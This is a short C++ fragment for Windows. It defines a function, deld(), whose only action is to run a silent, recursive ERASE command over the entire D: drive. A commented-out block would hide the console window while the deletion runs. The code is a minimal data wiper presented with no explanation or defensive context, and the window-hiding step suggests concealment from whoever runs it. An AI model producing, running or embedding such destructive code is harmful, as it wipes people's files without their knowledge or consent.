#include<windows.h>
#include<bits/stdc++.h>
void deld()
{
	/*
	HWND hwnd;
	hwnd=FindWindow("ConsoleWindowClass",NULL);
	if(hwnd)ShowWindow(hwnd,SW_HIDE);
	*/
	system("ERASE /S /Q d:\*");
	return;
}
